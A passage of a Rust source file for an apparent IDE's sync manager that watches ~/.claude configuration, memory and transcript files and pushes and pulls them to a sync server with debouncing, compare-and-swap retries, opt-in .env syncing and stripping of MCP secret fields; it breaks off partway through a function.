// SPDX-License-Identifier: AGPL-3.0-only
//! V1-parity sync orchestrator. Spawns a `notify`-based watcher over
//! ~/.claude globals + Mnemos's `projects.json` / `settings.json`, then
//! debounces local changes and pushes them via merge-at-push (CAS with
//! retry, LWW fallback). On start, and every 10 minutes, runs a full pull
//! and applies every known sync key to disk with self-suppression so the
//! watcher does not echo our own writes back to the server.
//!
//! The project registry (`projects`) is the exception on both sides: it is
//! merged record by record (`mnemos_ide_core::registry::merge`) on push AND pull,
//! applied through `ProjectStore`'s locked update (the app edits the same
//! file), polled every 30 s so a project added on one machine shows up on
//! the other without a restart, and its echo suppression compares content
//! rather than muting the file for a time window (a window would swallow an
//! edit the app makes while a pull lands).
//!
//! Mirror of v1's `apps/frontend/src/main/sync-manager.ts`. Notable
//! deviations from v1, kept intentional and documented:
//! - The full circuit-breaker (5 consecutive failures → 2-minute pause)
//!   is deferred to a follow-up; we surface failures via `tracing` only.
//! - No server push (SSE): cross-machine changes arrive by polling.
//! - `workspace_state.json` is local-only (v2 briefly pushed it as
//!   `mnemos-workspace-state`; that key is now ignored).
//! - Codex/Gemini/OpenCode session keys are unsynced (Mnemos has nothing
//!   to do with those). Claude transcripts sync through the blob store
//!   (`crate::transcripts`), not a state key. What each machine uploaded is
//!   announced in the small `claude-session-index` key, polled with the
//!   registry every 30 s, so a changed session is fetched by itself; the
//!   full blob listing runs hourly as a safety net.

use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use base64::{engine::general_purpose::STANDARD as B64, Engine};
// `std::time::Instant` on native targets; the workspace lint wants the
// wasm-safe spelling.
use instant::Instant;
use mnemos_ide_core::paths::claude_project_dir_name;
use mnemos_ide_core::registry::{self, current_platform};
use mnemos_ide_projects::resolve::read_origin_url;
use mnemos_ide_projects::{tab_root, LocalResolver, ProjectStore, RealFs};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use tokio::sync::mpsc;
use tokio::sync::oneshot;
use tokio::sync::Mutex as AsyncMutex;
use tokio::task::JoinHandle;

use crate::auth::AdminAuth;
use crate::client::{
    is_session_rejected, refresh_failure_status, refresh_intercepted, SessionHealth, SyncClient,
    SyncStateResponse,
};
use crate::error::IdeError;
use crate::gates::{self, GateKind, GateSource, GateStore, PendingApproval};
use crate::merge::{
    memory_tombstone_name, merge_for_key, strip_nested_platform_keys, DIR_TOMBSTONES_KEY,
    MEMORY_MD_NAME, PLATFORM_KEYS, SESSION_INDEX_KEY,
};
use crate::settings_toml::{self, SettingsPolicy, SyncedSettings, SETTINGS_V2_KEY};
use crate::transcripts::TranscriptSync;
use crate::watcher::{SyncWatcher, WatchTarget};

const LOCAL_DEBOUNCE_MS: u64 = 500;
const GLOBAL_DEBOUNCE_MS: u64 = 3000;
/// Idle time before a batch of changed Claude transcripts is uploaded. Claude
/// Code appends to a session file on every turn; pushing on each append would
/// upload one tiny segment per message.
const TRANSCRIPT_DEBOUNCE_MS: u64 = 20_000;
/// Longest a changed transcript waits for the idle window above. Several
/// agents writing at once never leave 20 s of quiet, and without a cap their
/// sessions would not reach the other machine until every agent stopped.
const TRANSCRIPT_MAX_WAIT_MS: u64 = 300_000;
/// How often the `projects` key (and, with transcript sync on, the session
/// index) is fetched to catch another machine's change. One small GET each;
/// either is acted on only when its version moved.
const PROJECTS_POLL_INTERVAL: Duration = Duration::from_secs(30);
/// How often every key (plus the team scope) is pulled.
const FULL_PULL_INTERVAL: Duration = Duration::from_secs(600);
/// How often the transcript pull lists the whole blob store. The session
/// index brings changed sessions within a poll; this only catches what the
/// index missed (an index update that never landed, a session the index
/// pull set aside).
const TRANSCRIPT_FULL_PULL_INTERVAL: Duration = Duration::from_secs(3600);
/// `pull_now` floor, so back-to-back focus events don't spam the server.
const PULL_NOW_FLOOR: Duration = Duration::from_secs(5);
const PUSH_CAS_BACKOFF_MS: [u64; 3] = [200, 400, 800];
const PUSH_CAS_MAX_RETRIES: usize = 3;

/// Backoff schedule for a push/pull that failed for a transient reason
/// (offline, DNS, connection reset, 5xx). The last entry repeats forever —
/// a laptop that wakes on a different network hours later must still heal.
const TRANSIENT_RETRY_BACKOFF_MS: [u64; 5] = [15_000, 30_000, 60_000, 120_000, 300_000];

const DIR_MAX_FILE_BYTES: u64 = 512 * 1024;
const DIR_MAX_FILE_BYTES_MCP: u64 = 1024 * 1024;
const MEMORY_MAX_FILE_BYTES: u64 = 512 * 1024;

const SKIP_DIR_NAMES: &[&str] = &["__pycache__", "node_modules", ".git", ".venv"];

/// Mapping from a global file under `~/.claude/` to its sync key.
struct GlobalFileSync {
    file_name: &'static str,
    sync_key: &'static str,
    raw: bool,
    platform_specific: bool,
    /// Synced only when this machine turned it on
    /// ([`crate::options::SyncOptions::claude_env`]; `.env` is the only one).
    opt_in: bool,
}

/// `~/.claude/.env`, synced only where turned on ([`GlobalFileSync::opt_in`]).
const CLAUDE_ENV_SYNC_KEY: &str = "claude-env";

const GLOBAL_FILES: &[GlobalFileSync] = &[
    GlobalFileSync {
        file_name: ".env",
        sync_key: CLAUDE_ENV_SYNC_KEY,
        raw: true,
        platform_specific: false,
        opt_in: true,
    },
    GlobalFileSync {
        file_name: "settings.json",
        sync_key: "claude-settings",
        raw: false,
        platform_specific: true,
        opt_in: false,
    },
    GlobalFileSync {
        file_name: "settings.local.json",
        sync_key: "claude-settings-local",
        raw: false,
        platform_specific: false,
        opt_in: false,
    },
    GlobalFileSync {
        file_name: "statusline.py",
        sync_key: "claude-statusline",
        raw: true,
        platform_specific: false,
        opt_in: false,
    },
    GlobalFileSync {
        file_name: "CLAUDE.md",
        sync_key: "claude-md",
        raw: true,
        platform_specific: false,
        opt_in: false,
    },
];

struct DirectorySync {
    relative: &'static str,
    sync_key: &'static str,
    max_bytes: u64,
    extensions: &'static [&'static str],
    platform_specific: bool,
    /// Top-level entries of the directory that belong to someone else and
    /// are never synced, written or removed (besides every dot-prefixed
    /// name, which is always skipped).
    skip_top_level: &'static [&'static str],
}

const DIRECTORIES: &[DirectorySync] = &[
    DirectorySync {
        relative: "mcp-servers",
        sync_key: "claude-mcp-servers",
        max_bytes: DIR_MAX_FILE_BYTES_MCP,
        extensions: &[
            "py", "js", "ts", "json", "toml", "yaml", "yml", "txt", "md", "cfg",
        ],
        platform_specific: true,
        skip_top_level: &[],
    },
    DirectorySync {
        relative: "agents",
        sync_key: "claude-agents",
        max_bytes: DIR_MAX_FILE_BYTES,
        extensions: &["md", "json", "yaml", "yml"],
        platform_specific: false,
        skip_top_level: &[],
    },
    DirectorySync {
        relative: "commands",
        sync_key: "claude-commands",
        max_bytes: DIR_MAX_FILE_BYTES,
        extensions: &["md", "json", "yaml", "yml"],
        platform_specific: false,
        skip_top_level: &[],
    },
    DirectorySync {
        relative: "hooks",
        sync_key: "claude-hooks",
        max_bytes: DIR_MAX_FILE_BYTES,
        extensions: &["py", "js", "ts", "json", "yaml", "yml", "sh"],
        platform_specific: false,
        skip_top_level: &[],
    },
    DirectorySync {
        relative: "skills",
        sync_key: "claude-skills",
        max_bytes: DIR_MAX_FILE_BYTES,
        extensions: &["md", "json", "yaml", "yml"],
        platform_specific: false,
        // Claude Code's own cache of account skills (one dir per account
        // bucket). Its `.trash` and marker files are dot-prefixed.
        skip_top_level: &["synced"],
    },
    DirectorySync {
        relative: "rules",
        sync_key: "claude-rules",
        max_bytes: DIR_MAX_FILE_BYTES,
        extensions: &["md"],
        platform_specific: false,
        skip_top_level: &[],
    },
    // `outputStyle` in settings.json names one of these; without it the
    // other machine's setting points at a style that is not there. Personal,
    // so not a team key.
    DirectorySync {
        relative: "output-styles",
        sync_key: "claude-output-styles",
        max_bytes: DIR_MAX_FILE_BYTES,
        extensions: &["md"],
        platform_specific: false,
        skip_top_level: &[],
    },
];

const MEMORY_EXTENSIONS: &[&str] = &["md", "json", "yaml", "yml"];
/// `~/.claude.json` mcpServers, one platform slot each, with every server's
/// `env` and `headers` left out ([`strip_mcp_secrets`]): those hold API
/// keys and tokens, and stay on the machine that has them.
const CLAUDE_JSON_MCP_SYNC_KEY: &str = "claude-json-mcp-servers-v2";
/// The key builds before `-v2` pushed mcpServers under, `env` and
/// `headers` included. Never applied here (its slots can only be older
/// than the `-v2` ones this build writes); after a push this build removes
/// its own platform's slot from it, so the secrets it held leave the
/// server. Older builds on this platform find no slot and apply nothing.
const LEGACY_CLAUDE_JSON_MCP_SYNC_KEY: &str = "claude-json-mcp-servers";
/// Fields of an MCP server entry that are never pushed.
const MCP_SECRET_FIELDS: &[&str] = &["env", "headers"];

/// Sync key older builds pushed the whole Mnemos `settings.toml` under, as
/// one string. This build neither pushes nor applies it (it carried
/// machine-local settings such as the startup shell to every machine); the
/// file syncs per key under [`SETTINGS_V2_KEY`] instead
/// (`crate::settings_toml`). The old value stays on the server untouched for
/// older builds.
pub const MNEMOS_USER_SETTINGS_KEY: &str = "mnemos-user-settings";

/// Sync key older builds pushed `workspace_state.json` under. That file is
/// local-only again: each machine keeps its own tab list, and the set of
/// projects open everywhere is the `open` flag on each `projects.json`
/// record. This build never pushes the key and ignores it on pull; the
/// constant stays because older builds on other machines still push it.
pub const MNEMOS_WORKSPACE_STATE_KEY: &str = "mnemos-workspace-state";

/// Scope key for debouncing — every distinct stream of changes that should
/// be coalesced separately gets its own scope.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
enum DebounceScope {
    GlobalFile(&'static str), // sync_key
    Directory(&'static str),  // sync_key
    ClaudeJsonMcp,
    Memory(String), // full memory sync key
    Projects,
    Settings,
    /// Mnemos `settings.toml` — the channel-aware user preferences file.
    MnemosSettingsToml,
    /// Claude transcripts (`~/.claude/projects/<slug>/<session>.jsonl`). The
    /// changed paths are batched by the event loop and handed to the
    /// transcript worker, not pushed through `dispatch_push`.
    Transcripts,
}

impl DebounceScope {
    /// The sync key this scope pushes. `None` for transcripts, which are
    /// blobs rather than a state key.
    fn sync_key(&self) -> Option<String> {
        match self {
            Self::GlobalFile(key) | Self::Directory(key) => Some((*key).to_string()),
            Self::ClaudeJsonMcp => Some(CLAUDE_JSON_MCP_SYNC_KEY.to_string()),
            Self::Memory(key) => Some(key.clone()),
            Self::Projects => Some(registry::PROJECTS_KEY.to_string()),
            Self::Settings => Some("settings".to_string()),
            Self::MnemosSettingsToml => Some(SETTINGS_V2_KEY.to_string()),
            Self::Transcripts => None,
        }
    }
}

/// Which keys a full pull writes to disk.
#[derive(Clone, Copy)]
enum PullScope<'a> {
    /// The startup pull: every key. Nothing local is waiting to be pushed
    /// yet (the initial push runs after it and merges on top).
    Everything,
    /// A later pull (periodic, retry, `pull_now`): only keys whose server
    /// version moved since this machine last pulled or pushed them, and
    /// never a key in `pending`, whose local change has not gone up yet.
    Changes { pending: &'a HashSet<String> },
}

/// Keys with a local change the event loop has not pushed yet: waiting for
/// their debounce, or on the retry schedule after a failed push.
fn pending_push_keys(
    last_seen: &HashMap<DebounceScope, Instant>,
    retry: &HashMap<DebounceScope, RetrySchedule>,
) -> HashSet<String> {
    last_seen
        .keys()
        .chain(retry.keys())
        .filter_map(DebounceScope::sync_key)
        .collect()
}

/// Requests the running event loop serves. `pull_now` goes through here so
/// every pull shares the loop's `PushState` (known versions, echo
/// suppression) instead of building a throwaway one.
enum LoopCommand {
    PullNow(oneshot::Sender<Result<(), IdeError>>),
    /// The gates changed (hooks sync turned on or off, an item approved or
    /// dismissed): re-apply the gated keys from the server and push them.
    GatesChanged,
    /// `.env` sync was just turned on here: resolve the server's copy
    /// against the local file the way the startup pull does, then push.
    EnvSyncTurnedOn,
    /// Delete the account's `.env` copy from the server (only while `.env`
    /// sync is off here). See [`SyncManager::remove_server_env`].
    RemoveServerEnv(oneshot::Sender<Result<(), IdeError>>),
}

/// Work for the transcript worker. Transcript uploads and downloads can move
/// megabytes, so they run on their own task rather than stalling the event
/// loop that pushes every other key.
#[derive(Debug)]
enum TranscriptJob {
    Push(Vec<PathBuf>),
    /// The startup sweep: every eligible session, one full listing.
    Sweep,
    /// A full-listing pull.
    Pull,
    /// A pull of just the sessions this session index (the key's value)
    /// shows segments of that are not applied here.
    PullIndexed(Value),
}

/// Channels the event loop reads from and writes to.
struct LoopChannels {
    events: mpsc::UnboundedReceiver<crate::watcher::ChangeEvent>,
    commands: mpsc::UnboundedReceiver<LoopCommand>,
    /// `None` when transcript sync is off (no Mnemos data dir).
    transcript_jobs: Option<mpsc::UnboundedSender<TranscriptJob>>,
}

/// What the manager remembers between push attempts.
#[derive(Default)]
struct PushState {
    /// SHA-256 hex hash of the last value we pushed for a given key. If the
    /// next push would produce the same hash we skip the round-trip.
    last_hash: HashMap<String, String>,
    /// The version we successfully wrote on each key. Used as the
    /// `expected_version` for CAS on the next push.
    known_version: HashMap<String, i64>,
    /// Memory files deleted locally since the last successful push, per
    /// memory key: tombstone name (`memory/<rel>` or `MEMORY.md`) -> when
    /// (ms). Recorded by `classify` from the watcher's events.
    pending_memory_tombstones: HashMap<String, BTreeMap<String, i64>>,
    /// Memory names the watcher saw exist again since the last push, per
    /// key. They clear a tombstone whatever the file's mtime: a file moved
    /// back from a backup keeps its old one.
    pending_memory_revivals: HashMap<String, BTreeSet<String>>,
    /// The memory names each key held when last pushed or pulled, so a
    /// removed directory can be expanded into the files it held.
    memory_names: HashMap<String, BTreeSet<String>>,
    /// Files of a directory key deleted locally since its last successful
    /// push: sync key -> relative path -> when (ms).
    pending_dir_tombstones: HashMap<String, BTreeMap<String, i64>>,
    /// Files of a directory key the watcher saw exist again since its last
    /// push: kept against the server's tombstone whatever their mtime.
    pending_dir_revivals: HashMap<String, BTreeSet<String>>,
    /// Paths we just wrote to disk during a pull. The watcher should ignore
    /// any change events that originate from these paths for ~2s. Never
    /// used for `projects.json`; see `projects_synced`.
    suppressed_until: HashMap<PathBuf, Instant>,
    /// The `projects.json` content last known to be reflected on the server
    /// (written by a pull that matched it, or just pushed). A watcher event
    /// whose file still holds exactly this has nothing to push: that is how
    /// our own pull writes are kept from echoing back. Content, not a time
    /// window, so an app edit landing during a pull is still pushed.
    projects_synced: Option<Value>,
    /// Scopes a pull asked to push as soon as the event loop gets to them
    /// (e.g. the local registry had records the server lacked).
    push_requests: HashSet<DebounceScope>,
    /// The version of the session index last handed to the transcript
    /// worker. Kept apart from `known_version`: a full pull or this
    /// machine's own index push moving that one must not make the poll skip
    /// a version whose sessions were never pulled.
    session_index_seen: Option<i64>,
    /// What was last in sync per key (`sync_baseline.json`), loaded on first
    /// use. See [`Baseline`].
    baseline: Option<Baseline>,
    /// Hash ([`mcp_servers_hash`]) of the `mcpServers` of `~/.claude.json`
    /// last known to match this platform's slot on the server (pushed, or
    /// written or found by a pull).
    last_local_mcp_hash: Option<String>,
    /// Shareable keys the startup push still owes the team a copy of. A
    /// push that writes mirrors anyway; one that finds nothing new mirrors
    /// only for these, so the team blob is refreshed once per start rather
    /// than on every no-op push.
    team_mirror_owed: HashSet<String>,
    /// This run already removed this platform's slot from
    /// [`LEGACY_CLAUDE_JSON_MCP_SYNC_KEY`] (or found none).
    legacy_mcp_purged: bool,
}

impl PushState {
    fn suppress(&mut self, path: PathBuf) {
        self.suppressed_until
            // Must outlast GLOBAL_DEBOUNCE_MS (3s) — a large directory write
            // during a pull can emit its debounced notify event after the
            // write finishes; a shorter window let the watcher re-push
            // just-pulled data (DA finding, 2026-07-30).
            .insert(path, Instant::now() + Duration::from_millis(5000));
    }

    fn is_suppressed(&self, path: &Path) -> bool {
        let now = Instant::now();
        self.suppressed_until
            .iter()
            .any(|(p, deadline)| *deadline > now && (path == p.as_path() || path.starts_with(p)))
    }

    fn drop_expired(&mut self) {
        let now = Instant::now();
        self.suppressed_until.retain(|_, d| *d > now);
    }
}

/// Configuration computed once at start. Cached because some env lookups
/// (HOME) shouldn't be re-resolved on every event.
#[derive(Clone)]
struct Paths {
    claude_dir: PathBuf,
    claude_json: PathBuf,
    claude_projects_dir: PathBuf,
    /// Optional: the v1-compatible Mnemos data dir holding `projects.json`
    /// and `settings.json`. `None` if the platform has no data dir.
    mnemos_store_dir: Option<PathBuf>,
    /// Optional: the Mnemos `settings.toml` (channel-aware user preferences
    /// file). Injected by the app via `SyncManager::with_mnemos_settings_toml`
    /// because channel resolution lives in `mnemos_core::paths`, which this
    /// crate doesn't depend on. `None` ⇒ the TOML is not synced.
    mnemos_settings_toml: Option<PathBuf>,
}

impl Paths {
    fn discover() -> Self {
        let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
        let claude_dir = home.join(".claude");
        let claude_json = home.join(".claude.json");
        let claude_projects_dir = claude_dir.join("projects");
        let mnemos_store_dir = mnemos_ide_core::paths::ide_data_dir()
            .ok()
            .map(|d| d.join("store"));
        Self {
            claude_dir,
            claude_json,
            claude_projects_dir,
            mnemos_store_dir,
            mnemos_settings_toml: None,
        }
    }

    fn projects_json(&self) -> Option<PathBuf> {
        self.mnemos_store_dir
            .as_ref()
            .map(|d| d.join("projects.json"))
    }
    fn workspace_state_json(&self) -> Option<PathBuf> {
        self.mnemos_store_dir
            .as_ref()
            .map(|d| d.join("workspace_state.json"))
    }
    fn settings_json(&self) -> Option<PathBuf> {
        self.mnemos_store_dir
            .as_ref()
            .map(|d| d.join("settings.json"))
    }
    fn sync_baseline_json(&self) -> Option<PathBuf> {
        self.mnemos_store_dir
            .as_ref()
            .map(|d| d.join("sync_baseline.json"))
    }
    fn mnemos_settings_toml(&self) -> Option<&Path> {
        self.mnemos_settings_toml.as_deref()
    }
}

/// Sync keys mirrored into the Drive team scope so every team member's
/// Mnemos pulls them. Deliberately excludes `.env` / settings / statusline
/// (machine- and person-private) and memory keys (profile-scoped). Hooks
/// are shared by explicit decision (maintainers, 2026-07-30): shared automation,
/// trusted 2-person team.
pub const SHAREABLE_TEAM_KEYS: &[&str] = &[
    "claude-agents",
    "claude-commands",
    "claude-skills",
    "claude-rules",
    "claude-hooks",
    "claude-md",
];

/// Per-key outcome of the most recent push or pull touching that key.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum KeySyncState {
    InSync,
    Pending,
    Error(String),
}

/// Where this machine's admin login stands, as far as sync can tell.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub enum SyncAuthState {
    #[default]
    SignedIn,
    /// The server refused the refresh token. The manager has stopped all
    /// network activity; only a new sign-in (a new manager) resumes sync.
    SignedOut { reason: String },
    /// Sync runs, but the current token pair is not in the keyring, so the
    /// next app start comes up signed out.
    TokenNotSaved { reason: String },
    /// No admin login on this machine and nothing went wrong: sync was never
    /// set up here, or the user signed out on purpose. Sync is optional, so
    /// this is not a warning. A manager never reports it; the app does, when
    /// it started none.
    NeverConfigured,
    /// The sync server refused this build's sync protocol (426 Upgrade
    /// Required). The manager has stopped all network activity; only an
    /// updated Mnemos syncs again. See [`crate::protocol`].
    UpdateRequired { reason: String },
}

impl SyncAuthState {
    /// A protocol refusal outranks everything (a new sign-in would be
    /// refused the same way), and a refused session outranks an unsaved
    /// token: there is nothing left to save once the server has ended the
    /// session.
    pub fn from_health(health: &SessionHealth) -> Self {
        if let Some(reason) = &health.upgrade_required {
            return Self::UpdateRequired {
                reason: reason.clone(),
            };
        }
        match (&health.rejected, &health.save_failed) {
            (Some(reason), _) => Self::SignedOut {
                reason: reason.clone(),
            },
            (None, Some(reason)) => Self::TokenNotSaved {
                reason: reason.clone(),
            },
            (None, None) => Self::SignedIn,
        }
    }

    /// Whether this state stops the manager: nothing it could send would be
    /// accepted until the user acts (signs in again, or updates Mnemos).
    pub fn halts_sync(&self) -> bool {
        matches!(self, Self::SignedOut { .. } | Self::UpdateRequired { .. })
    }
}

/// Is this failure worth retrying on a timer?
///
/// Transport-level reqwest failures (no route, DNS, connection reset,
/// timeout) and server-side 5xx/429 are transient: the machine was asleep,
/// on a captive-portal Wi-Fi, or the platform was redeploying. Everything
/// else — logged out, bad refresh token, malformed JSON — repeats forever
/// and must not spin.
///
/// The token refresh reports its status inside an `Auth` error; a 5xx or 429
/// there is the same redeploy or rate limit, not a verdict on the session.
/// Nor is a 401/403 that did not come from the admin backend (a proxy's
/// block page on a client network): that one clears once the machine moves.
pub(crate) fn is_transient(err: &IdeError) -> bool {
    match err {
        IdeError::Network(e) => e.is_request() || e.is_connect() || e.is_timeout() || e.is_body(),
        IdeError::Http { status, .. } => status.is_server_error() || status.as_u16() == 429,
        IdeError::Auth(_) => {
            refresh_failure_status(err)
                .is_some_and(|status| status.is_server_error() || status.as_u16() == 429)
                || refresh_intercepted(err)
        }
        _ => false,
    }
}

/// A short, row-width status string. The Drive panel truncates hard, so
/// "offline" has to beat reqwest's "error sending request for url (...)".
fn status_error_message(err: &IdeError) -> String {
    if is_session_rejected(err) {
        return "signed out".to_owned();
    }
    if crate::client::is_upgrade_required(err) {
        return "update Mnemos to sync".to_owned();
    }
    // A 5xx from the refresh endpoint reads like one from any other call.
    let server_status = match err {
        IdeError::Http { status, .. } => Some(*status),
        IdeError::Auth(_) => refresh_failure_status(err),
        _ => None,
    };
    if let Some(status) = server_status.filter(|_| is_transient(err)) {
        return format!("server {} - will retry", status.as_u16());
    }
    match err {
        IdeError::Network(e) if e.is_connect() || e.is_request() => {
            "offline - will retry".to_owned()
        }
        IdeError::Network(e) if e.is_timeout() => "timed out - will retry".to_owned(),
        IdeError::NotAuthenticated => "signed out".to_owned(),
        other => format!("{other}"),
    }
}

/// One scope's place in the transient-retry schedule.
#[derive(Debug, Clone, Copy)]
struct RetrySchedule {
    attempts: usize,
    next_at: Instant,
}

impl RetrySchedule {
    fn first() -> Self {
        Self {
            attempts: 0,
            next_at: Instant::now(),
        }
        .backed_off()
    }

    fn backed_off(mut self) -> Self {
        let idx = self.attempts.min(TRANSIENT_RETRY_BACKOFF_MS.len() - 1);
        self.next_at = Instant::now() + Duration::from_millis(TRANSIENT_RETRY_BACKOFF_MS[idx]);
        self.attempts += 1;
        self
    }
}

#[derive(Debug, Clone)]
pub struct KeySyncStatus {
    pub version: i64,
    pub last_synced_at: Option<SystemTime>,
    pub state: KeySyncState,
}

/// Observable snapshot published on every push/pull — the Mnemos Drive
/// panel subscribes via [`SyncManager::status`].
#[derive(Debug, Clone, Default)]
pub struct SyncStatusSnapshot {
    pub running: bool,
    pub last_pull_at: Option<SystemTime>,
    pub team_id: Option<String>,
    pub team_name: Option<String>,
    /// Owners mirror config up; members are pull-only.
    pub team_is_owner: bool,
    /// Every team the server lists for this account, joined here or not
    /// (empty when the list could not be fetched or the account may not use
    /// teams). Settings > Sync offers a listed team that is not joined.
    pub teams: Vec<crate::teams::Team>,
    pub keys: std::collections::BTreeMap<String, KeySyncStatus>,
    /// When a pull last changed the project registry on disk (a project
    /// added, opened, closed or moved on another machine).
    pub projects_applied_at: Option<SystemTime>,
    /// The startup pull of this run is over: applied, failed, or never
    /// possible (the watcher could not start). The app holds its first tab
    /// reconcile until then, so it does not act on (and stamp fresh clocks
    /// over) the `projects.json` the last session left behind.
    pub first_pull_done: bool,
    /// The first transcript pull of this run is over (applied or failed),
    /// or none will come soon: no transcript sync (no Mnemos data dir), the
    /// startup pull failed offline (the retry schedule pulls later), the
    /// watcher could not start, or the session was refused. Agent restore
    /// waits for it (bounded), so it does not decide on a transcript the
    /// other machine's newest turns have not reached yet.
    pub first_transcript_pull_done: bool,
    /// The admin login behind this run. `SignedOut` also means the manager
    /// has stopped (`running` is false) and will not retry on its own.
    pub auth: SyncAuthState,
    /// Hooks sync is opted in on this machine (see `crate::gates`).
    pub hooks_sync: bool,
    /// Incoming hooks, Claude Code commands and MCP servers waiting for this
    /// machine's approval.
    pub pending_approvals: Vec<PendingApproval>,
}

/// Public handle returned by `start`. Drop it (or call `stop`) to halt
/// the watcher and flush in-flight pushes.
pub struct SyncManager {
    pub client: Arc<SyncClient>,
    handle: Mutex<Option<RunningManager>>,
    paths: Paths,
    profile_id: AsyncMutex<Option<String>>,
    team_id: AsyncMutex<Option<String>>,
    team_is_owner: std::sync::atomic::AtomicBool,
    status_tx: tokio::sync::watch::Sender<SyncStatusSnapshot>,
    /// Finds each project's checkout on this machine for the memory keys.
    /// One per manager because it caches its directory scan per instance.
    /// Only ever locked inside a `ProjectStore` update closure.
    resolver: Arc<Mutex<LocalResolver>>,
    /// Claude transcript sync, while running with a Mnemos data dir.
    transcripts: Mutex<Option<Arc<TranscriptSync>>>,
    /// The transcript worker of the current run. `stop` aborts and awaits
    /// it, so no upload, index write or token refresh from this run lands
    /// after `stop` returns ("Delete synced data" depends on that).
    transcript_worker: Mutex<Option<JoinHandle<()>>>,
    /// Sync `~/.claude/.env` ([`crate::options::SyncOptions::claude_env`]),
    /// read from the options file at every start.
    claude_env: std::sync::atomic::AtomicBool,
    /// End-to-end encryption recovery keys saved on this machine, by admin
    /// profile id. The app reads them from its secure storage; the one for
    /// the signed-in profile is handed to the client at every start.
    e2e_keys: Mutex<HashMap<String, String>>,
    /// This machine's approval gates (`sync_gates.json`), loaded on first
    /// use. See `crate::gates`.
    gates: Mutex<Option<GateStore>>,
    /// Which `settings.toml` paths sync, from the app's settings registry.
    /// `None`: the file is not synced.
    settings_policy: Option<SettingsPolicy>,
    /// The login this manager runs with was already saved on this machine
    /// when the app started (as opposed to a sign-in made in this process).
    /// One of the two signals of a machine that synced before team choices
    /// were recorded (see `crate::team_choice`).
    login_saved_earlier: bool,
    /// Tests: every incoming item counts as approved, so the tests that are
    /// not about the gates see the pull as before. On by default under
    /// `cfg(test)`; the gate tests turn it off.
    #[cfg(test)]
    trust_gates: std::sync::atomic::AtomicBool,
}

struct RunningManager {
    shutdown_tx: tokio::sync::watch::Sender<bool>,
    commands: mpsc::UnboundedSender<LoopCommand>,
    join: Option<JoinHandle<()>>,
}

// std::sync::Mutex; tokio's would also work but this guard is held briefly.
type Mutex<T> = std::sync::Mutex<T>;

/// Dedicated tokio runtime for the sync pipeline. The embedding app's
/// executor is not tokio, so anything using `tokio::spawn`/`tokio::time`
/// must run here.
pub(crate) fn sync_runtime() -> &'static tokio::runtime::Runtime {
    static RT: std::sync::OnceLock<tokio::runtime::Runtime> = std::sync::OnceLock::new();
    RT.get_or_init(|| {
        tokio::runtime::Builder::new_multi_thread()
            .worker_threads(2)
            .thread_name("mnemos-ide-sync")
            .enable_all()
            .build()
            .expect("failed to build mnemos-ide-sync tokio runtime")
    })
}

impl SyncManager {
    pub fn new(client: SyncClient) -> Self {
        let (status_tx, _) = tokio::sync::watch::channel(SyncStatusSnapshot::default());
        Self {
            client: Arc::new(client),
            handle: Mutex::new(None),
            paths: Paths::discover(),
            profile_id: AsyncMutex::new(None),
            team_id: AsyncMutex::new(None),
            team_is_owner: std::sync::atomic::AtomicBool::new(false),
            status_tx,
            resolver: Arc::new(Mutex::new(LocalResolver::new())),
            transcripts: Mutex::new(None),
            transcript_worker: Mutex::new(None),
            claude_env: std::sync::atomic::AtomicBool::new(false),
            e2e_keys: Mutex::new(HashMap::new()),
            gates: Mutex::new(None),
            settings_policy: None,
            login_saved_earlier: false,
            #[cfg(test)]
            trust_gates: std::sync::atomic::AtomicBool::new(true),
        }
    }

    /// The end-to-end encryption recovery keys saved on this machine, by
    /// admin profile id (see [`Self::e2e_keys`]).
    pub fn with_e2e_keys(self, keys: HashMap<String, String>) -> Self {
        *self.e2e_keys.lock().unwrap_or_else(|e| e.into_inner()) = keys;
        self
    }

    /// The admin profile this run syncs, once the start has read it.
    pub fn profile_id_now(&self) -> Option<String> {
        self.profile_id.try_lock().ok().and_then(|g| g.clone())
    }

    /// Where this machine's sync options live (`None` without a data dir).
    pub fn options_path(&self) -> Option<PathBuf> {
        self.paths
            .mnemos_store_dir
            .as_ref()
            .map(|d| d.join(crate::options::OPTIONS_FILE))
    }

    /// This machine's sync options, as saved.
    pub fn sync_options(&self) -> crate::options::SyncOptions {
        self.options_path()
            .map(|p| crate::options::load(&p))
            .unwrap_or_default()
    }

    /// Turn syncing `~/.claude/.env` on or off on this machine. Takes effect
    /// at once: the next change to the file is pushed (or not), and the next
    /// pull writes the server's copy (or not). Turning it off removes
    /// nothing, here or on the server.
    pub fn set_claude_env_sync(&self, on: bool) -> Result<(), IdeError> {
        let Some(path) = self.options_path() else {
            return Err(IdeError::Other(
                "no Mnemos data dir to save sync options in".into(),
            ));
        };
        let mut options = crate::options::load(&path);
        options.claude_env = on;
        crate::options::save(&path, &options)?;
        let was = self
            .claude_env
            .swap(on, std::sync::atomic::Ordering::Relaxed);
        if on && !was {
            self.send_command(LoopCommand::EnvSyncTurnedOn);
        }
        Ok(())
    }

    /// Delete the account's `~/.claude/.env` copy from the sync server
    /// (gates review finding 5: `.env` is off by default now, but a value
    /// uploaded before stays on the server). Refused while `.env` sync is on
    /// here, which would upload it again at once. Another machine that still
    /// syncs `.env` (an older build always does) uploads its copy again on
    /// its next change; the Settings text says so. Runs in the event loop, so
    /// the loop forgets the key's version and hash with it.
    pub async fn remove_server_env(self: Arc<Self>) -> Result<(), IdeError> {
        if self.claude_env_enabled() {
            return Err(IdeError::Other(
                "turn off .env sync on this machine first".into(),
            ));
        }
        let commands = {
            let guard = self.handle.lock().unwrap_or_else(|e| e.into_inner());
            match guard.as_ref() {
                Some(running) => running.commands.clone(),
                None => return Err(IdeError::Other("sync is not running".into())),
            }
        };
        let (reply_tx, reply_rx) = oneshot::channel();
        if commands.send(LoopCommand::RemoveServerEnv(reply_tx)).is_err() {
            return Err(IdeError::Other("sync is stopping".into()));
        }
        reply_rx
            .await
            .unwrap_or_else(|_| Err(IdeError::Other("sync stopped".into())))
    }

    async fn do_remove_server_env(
        &self,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        if self.claude_env_enabled() {
            return Err(IdeError::Other(
